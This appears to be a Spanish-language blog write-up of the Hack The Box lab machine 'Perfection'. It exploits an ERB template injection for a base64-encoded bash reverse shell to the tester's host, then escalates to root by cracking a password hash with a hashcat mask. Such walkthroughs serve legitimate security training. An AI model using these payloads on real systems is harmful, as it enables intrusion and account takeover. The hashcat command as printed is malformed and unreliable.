---
title: Perfection
description: Perfection es una máquina Linux de dificultad fácil que cuenta con una aplicación web con la funcionalidad de calcular las puntuaciones de los estudiantes. Esta aplicación es vulnerable a la Server-Side Template Injection (SSTI) a través de un bypass de filtro regex. Se puede obtener un acceso inicial explotando la vulnerabilidad SSTI. Al enumerar los usuarios se revela que son parte del grupo sudo. Una mayor enumeración descubre una base de datos con hashes de contraseñas, y el correo del usuario revela un posible formato de contraseña. Usando un ataque de máscara en el hash, se obtiene la contraseña del usuario, la cual se utiliza para obtener acceso root.
date: 2024-05-22
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-perfection/perfection_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - ssti
  - data_leaks
  - password_attacks
  - ssh
  - http
  - tcp
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/perfection:-$ sudo nmap -sC -sV 10.10.11.253 
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz41H9QQUPCXN7lJsU+fbjZ/vR4Ho/eacq8LnS89xLx4vsJvjUJCcZgMYAmhHLXIGKnVv16ipqPaDom5cK9tig=
|   256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqNwnyqGqYHNSIjQnv7hRU0UC9Q4oB4g9Pfzuj2qcG4
80/tcp open  http    syn-ack ttl 63 nginx
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
## Web Analysis

![](/assets/img/htb-writeup-perfection/perfection1.png)
![](/assets/img/htb-writeup-perfection/perfection2.png)
![](/assets/img/htb-writeup-perfection/perfection3.png)
![](/assets/img/htb-writeup-perfection/perfection4.png)

## Vulnerability Exploitation

Vulnerable a Server Side Template Injection.

<https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection##erb-ruby>

![](/assets/img/htb-writeup-perfection/perfection5.png)
![](/assets/img/htb-writeup-perfection/perfection6.png)
![](/assets/img/htb-writeup-perfection/perfection7.png)

Creo el payload en base64.

```terminal
-$ echo 'bash -c "bash -i >& /dev/tcp/10.10.16.65/4444 0>&1"' > payload.sh

-$ cat payload.sh | base64 | xclip -sel clip
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg==
```
El payload quedaria de la siguiente manera:

```
%0A<%25%3d+system("echo+'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg=='+|base64+-d+|bash")+%25>
```

```terminal
-$ nc -nlvp 4444
	lisening on [any] 4444 ...
```

Luego de ponerme en escucha con Netcat, envio la peticion 'POST'.

![](/assets/img/htb-writeup-perfection/perfection8.png)

```terminal
	...connect to [10.10.16.65] from (UNKNOWN) [10.10.11.253] 35964

$ python3 -c "import pty;pty.spawn('/bin/bash')"

susan@perfection:~$ cat user.txt
```

---
## Privilege Escalation

Enumerando el sistema, encuentro dos archivos importantes: 'pupilpath_credentials.db', que contiene un hash que parece corresponder a una contraseña, y un correo con instrucciones para establecer el formato de una nueva contraseña.

![](/assets/img/htb-writeup-perfection/perfection10.png)
![](/assets/img/htb-writeup-perfection/perfection11.png)

Con esta información, puedo reconstruir gran parte de la contraseña:

```text
{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1.000.000.000}
   susan   _       nasus         _                    ?????????
```

Solo me restaría encontrar el número entre 1 y 1.000.000.000, lo cual es fácilmente descifrable conociendo el hash.

```terminal
/home/kali/Documents/htb/machines/perfection:-$ echo 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f' > hash

/home/kali/Documents/htb/machines/perfection:-$ hashcat -m 1400 -a hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d > password
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```
```terminal
/home/kali/Documents/htb/machines/perfection:-$ ssh susan@10.10.11.253
susan@10.10.11.253's password: susan_nasus_413759210 

susan@perfection:~$ sudo su
sudo password for susan: susan_nasus_413759210 

root@perfection:/home/susan## cat /root/root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/590" target="_blank">***Litio7 has successfully solved Perfection from Hack The Box***</a>
{: .prompt-info style="text-align:center" }